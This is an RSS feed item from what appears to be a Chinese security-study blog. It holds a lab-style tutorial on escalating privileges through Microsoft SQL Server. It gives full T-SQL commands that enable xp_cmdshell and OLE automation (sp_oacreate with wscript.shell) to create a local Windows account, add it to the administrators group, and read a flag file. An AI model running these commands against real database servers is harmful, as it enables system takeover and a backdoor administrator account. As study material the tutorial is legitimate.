<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>My Violet Eva Garden • Posts by &#34;数据库安全&#34; category</title>
        <link>https://kiyomijin.github.io</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Tue, 27 Sep 2022 22:46:06 +0800</pubDate>
        <lastBuildDate>Tue, 27 Sep 2022 22:46:06 +0800</lastBuildDate>
        <category>G计划</category>
        <category>原创</category>
        <category>SQL注入探究</category>
        <category>数据库安全</category>
        <category>XSS跨站脚本攻击探究</category>
        <category>文件上传漏洞探究</category>
        <category>CTF小训</category>
        <category>Misc</category>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</guid>
            <title>MSSQL提权攻击</title>
            <link>https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</link>
            <category>数据库安全</category>
            <pubDate>Tue, 27 Sep 2022 22:46:06 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL-Server（MSSQL）提权&#34;&gt;&lt;a href=&#34;#SQL-Server（MSSQL）提权&#34; class=&#34;headerlink&#34; title=&#34;SQL Server（MSSQL）提权&#34;&gt;&lt;/a&gt;SQL Server（MSSQL）提权&lt;/h1&gt;&lt;p&gt;总结一下，下文使用有效命令全部为：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--1.xp_cmdshell提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#master..xp_cmdshell的全写是master.dbo.xp_cmdshell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net user HeyJack HeyJack /add&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net localgroup administrators HeyJack /add&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;ipconfig&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;type C:\Documents and Settings\桌面\flag.txt&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--恢复语句&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--2.sp_oacreate提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ole Automation Procedures&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;declare&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oacreate &lt;span class=&#34;string&#34;&gt;&amp;#x27;wscript.shell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; output;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oamethod &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;run&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;c:\windows\system32\cmd.exe /c net user HeyJack1 HeyJack1 /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;declare&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oacreate &lt;span class=&#34;string&#34;&gt;&amp;#x27;wscript.shell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; output;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oamethod &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;run&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;c:\windows\system32\cmd.exe /c net localgroup administrators HeyJack1 /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--恢复语句&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ole Automation Procedures&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;--3.沙盒提权(不常用，所以没粘贴出来)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;0x01-环境准备&#34;&gt;&lt;a href=&#34;#0x01-环境准备&#34; class=&#34;headerlink&#34; title=&#34;0x01 环境准备&#34;&gt;&lt;/a&gt;0x01 环境准备&lt;/h2&gt;&lt;p&gt;输入用户名和密码，以&lt;code&gt;sa&lt;/code&gt;身份登录SQL Server2005&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927205858375.png&#34; alt=&#34;image-20220927205858375&#34;&gt;&lt;/p&gt;
&lt;p&gt;登录后可以看到这样的界面&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927210049933.png&#34; alt=&#34;image-20220927210049933&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先我们了解下什么是sp_configure？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927210431221.png&#34; alt=&#34;image-20220927210431221&#34;&gt;&lt;/p&gt;
&lt;p&gt;其中，在列出高级配置选项的例子中，官网显示了如何设置和列出所有配置选项：首先就是要设置&lt;code&gt;show advanced options&lt;/code&gt;为&lt;code&gt;1&lt;/code&gt;，可以显示高级选项。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;USE master;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GO  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;sp_configure的作用是显示或更改当前服务器的全局配置的高级选项，执行成功返回0，失败返回1，其中高级选项中包含cmdshell等。&lt;/p&gt;
&lt;h2 id=&#34;0x02-xp-cmdshell提权步骤&#34;&gt;&lt;a href=&#34;#0x02-xp-cmdshell提权步骤&#34; class=&#34;headerlink&#34; title=&#34;0x02 xp_cmdshell提权步骤&#34;&gt;&lt;/a&gt;0x02 xp_cmdshell提权步骤&lt;/h2&gt;&lt;h3 id=&#34;①第一步，更改当前服务器的全局配置首选高级选项为1&#34;&gt;&lt;a href=&#34;#①第一步，更改当前服务器的全局配置首选高级选项为1&#34; class=&#34;headerlink&#34; title=&#34;①第一步，更改当前服务器的全局配置首选高级选项为1&#34;&gt;&lt;/a&gt;①第一步，更改当前服务器的全局配置首选高级选项为1&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#以下大写字母均可小写&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;RECONFIGURE;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211220768.png&#34; alt=&#34;image-20220927211220768&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用鼠标选中一行，然后右键选择执行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211614093.png&#34; alt=&#34;image-20220927211614093&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;②第二步，打开cmd-shell&#34;&gt;&lt;a href=&#34;#②第二步，打开cmd-shell&#34; class=&#34;headerlink&#34; title=&#34;②第二步，打开cmd-shell&#34;&gt;&lt;/a&gt;②第二步，打开cmd-shell&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;xp_cmdshell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211736845.png&#34; alt=&#34;image-20220927211736845&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;③第三步，输入你想执行的windows-cmd命令。&#34;&gt;&lt;a href=&#34;#③第三步，输入你想执行的windows-cmd命令。&#34; class=&#34;headerlink&#34; title=&#34;③第三步，输入你想执行的windows cmd命令。&#34;&gt;&lt;/a&gt;③第三步，输入你想执行的windows cmd命令。&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927211958154.png&#34; alt=&#34;image-20220927211958154&#34;&gt;&lt;/p&gt;
&lt;p&gt;言归正传，我们为系统添加属于&lt;code&gt;攻击者自己的net user账户&lt;/code&gt;(主要目的是使用已知的用户名和密码)&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#比如，账户名是HeyJack 密码也是HeyJack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net user HeyJack HeyJack /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927212339481.png&#34; alt=&#34;image-20220927212339481&#34;&gt;&lt;/p&gt;
&lt;p&gt;此时，我们在windows的cmd里，执行net user&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;这一步是在服务器里面查看。当然，现在只是为了展示我们的创建结果。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net user&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927212609276.png&#34; alt=&#34;image-20220927212609276&#34;&gt;&lt;/p&gt;
&lt;p&gt;“开始”菜单—管理工具—计算机管理—本地用户和组—用户—HeyJack右键属性—隶属于&lt;/p&gt;
&lt;p&gt;查看当前分组在Users组&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927212746484.png&#34; alt=&#34;image-20220927212746484&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;④第四步，将你新建的用户移到administrators组&#34;&gt;&lt;a href=&#34;#④第四步，将你新建的用户移到administrators组&#34; class=&#34;headerlink&#34; title=&#34;④第四步，将你新建的用户移到administrators组&#34;&gt;&lt;/a&gt;④第四步，将你新建的用户移到administrators组&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;net localgroup administrators HeyJack /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213122417.png&#34; alt=&#34;image-20220927213122417&#34;&gt;&lt;/p&gt;
&lt;p&gt;继续查看我们的分组情况，可以看到，提权成功：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213219218.png&#34; alt=&#34;image-20220927213219218&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;⑤第五步，获取远程服务器中的目标文件&#34;&gt;&lt;a href=&#34;#⑤第五步，获取远程服务器中的目标文件&#34; class=&#34;headerlink&#34; title=&#34;⑤第五步，获取远程服务器中的目标文件&#34;&gt;&lt;/a&gt;⑤第五步，获取远程服务器中的目标文件&lt;/h3&gt;&lt;p&gt;我们假设，服务器中管理员Administrator创建了一个flag.txt文件放在了桌面，我们的&lt;code&gt;最终目的&lt;/code&gt;就是&lt;strong&gt;为了获取它&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221944235.png&#34; alt=&#34;image-20220927221944235&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;第一种方案，3389远程连接&#34;&gt;&lt;a href=&#34;#第一种方案，3389远程连接&#34; class=&#34;headerlink&#34; title=&#34;第一种方案，3389远程连接&#34;&gt;&lt;/a&gt;第一种方案，3389远程连接&lt;/h4&gt;&lt;p&gt;在win+R输入&lt;code&gt;mstsc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213803912.png&#34; alt=&#34;image-20220927213803912&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看服务器ip并在自己的客户端上连接，ip地址也可以通过SQL提权命令+ “ipconfig”来获取&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221540178.png&#34; alt=&#34;image-20220927221540178&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后3389远程连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927213905588.png&#34; alt=&#34;image-20220927213905588&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入刚刚新建的用户民和密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927214036680.png&#34; alt=&#34;image-20220927214036680&#34;&gt;&lt;/p&gt;
&lt;p&gt;登录成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927214149105.png&#34; alt=&#34;image-20220927214149105&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后打开“我的电脑”—进入C盘—找到“Documents and Settings”—选择“Administrators”—桌面—即可看到flag.txt&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221815971.png&#34; alt=&#34;image-20220927221815971&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;第二种方案，使用SQL提权命令获取内容&#34;&gt;&lt;a href=&#34;#第二种方案，使用SQL提权命令获取内容&#34; class=&#34;headerlink&#34; title=&#34;第二种方案，使用SQL提权命令获取内容&#34;&gt;&lt;/a&gt;第二种方案，使用SQL提权命令获取内容&lt;/h4&gt;&lt;p&gt;另外，也可以使用SQL提权命令去当前管理员用户桌面查找（一般flag会放在桌面上）&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#dir命令查看当前路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;dir&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#type命令查看文件内容，一般低版本中，windows桌面的路径为：C:\Documents &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; Settings\桌面\flag.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; master..xp_cmdshell &lt;span class=&#34;string&#34;&gt;&amp;#x27;type C:\Documents and Settings\Administrator\桌面\flag.txt&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927221113281.png&#34; alt=&#34;image-20220927221113281&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;0x03-sp-oacreate提权步骤&#34;&gt;&lt;a href=&#34;#0x03-sp-oacreate提权步骤&#34; class=&#34;headerlink&#34; title=&#34;0x03 sp_oacreate提权步骤&#34;&gt;&lt;/a&gt;0x03 sp_oacreate提权步骤&lt;/h2&gt;&lt;h3 id=&#34;①第一步，更改当前服务器的全局配置首选高级选项为1-1&#34;&gt;&lt;a href=&#34;#①第一步，更改当前服务器的全局配置首选高级选项为1-1&#34; class=&#34;headerlink&#34; title=&#34;①第一步，更改当前服务器的全局配置首选高级选项为1&#34;&gt;&lt;/a&gt;①第一步，更改当前服务器的全局配置首选高级选项为1&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;show advanced options&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;②第二步，配置OLE过程&#34;&gt;&lt;a href=&#34;#②第二步，配置OLE过程&#34; class=&#34;headerlink&#34; title=&#34;②第二步，配置OLE过程&#34;&gt;&lt;/a&gt;②第二步，配置OLE过程&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_configure &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ole Automation Procedures&amp;#x27;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;reconfigure;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;③第三步，定义shell变量，int类型。&#34;&gt;&lt;a href=&#34;#③第三步，定义shell变量，int类型。&#34; class=&#34;headerlink&#34; title=&#34;③第三步，定义shell变量，int类型。&#34;&gt;&lt;/a&gt;③第三步，定义shell变量，int类型。&lt;/h3&gt;&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;declare&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;④第四步，生成shell对象&#34;&gt;&lt;a href=&#34;#④第四步，生成shell对象&#34; class=&#34;headerlink&#34; title=&#34;④第四步，生成shell对象&#34;&gt;&lt;/a&gt;④第四步，生成shell对象&lt;/h3&gt;&lt;p&gt;将结果赋值给第③步生成的shell变量里头。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oacreate &lt;span class=&#34;string&#34;&gt;&amp;#x27;wscript.shell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; output;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;⑤第五步，调用shell对象的run方法来调用net-user&#34;&gt;&lt;a href=&#34;#⑤第五步，调用shell对象的run方法来调用net-user&#34; class=&#34;headerlink&#34; title=&#34;⑤第五步，调用shell对象的run方法来调用net user&#34;&gt;&lt;/a&gt;⑤第五步，调用shell对象的run方法来调用net user&lt;/h3&gt;&lt;p&gt;返回值是null，方法体是执行system32目录下的cmd.exe，并使用net user生成HeyJack1账号&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oamethod &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;run&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;c:\windows\system32\cmd.exe /c net user HeyJack1 HeyJack1 /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927230925606.png&#34; alt=&#34;image-20220927230925606&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;⑥第六步，调用shell对象的run方法来调用net-localgroup&#34;&gt;&lt;a href=&#34;#⑥第六步，调用shell对象的run方法来调用net-localgroup&#34; class=&#34;headerlink&#34; title=&#34;⑥第六步，调用shell对象的run方法来调用net localgroup&#34;&gt;&lt;/a&gt;⑥第六步，调用shell对象的run方法来调用net localgroup&lt;/h3&gt;&lt;p&gt;返回值是null，方法体是执行cmd，并使用net localgroup 将HeyJack1挪到administrators组下&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oacreate &lt;span class=&#34;string&#34;&gt;&amp;#x27;wscript.shell&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt; output;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;exec&lt;/span&gt; sp_oamethod &lt;span class=&#34;variable&#34;&gt;@shell&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;run&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;c:\windows\system32\cmd.exe /c net localgroup administrators HeyJack1 /add&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220927231033604.png&#34; alt=&#34;image-20220927231033604&#34;&gt;&lt;/p&gt;
&lt;p&gt;以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。&lt;/p&gt;
&lt;p&gt;在oacreate的官方文档里明确指出了，如果要使用OLE对象，必须要开启 ‘Ole Automation Procedures’，也就是EXEC sp_configure ‘Ole Automation Procedures’, 1;&lt;/p&gt;
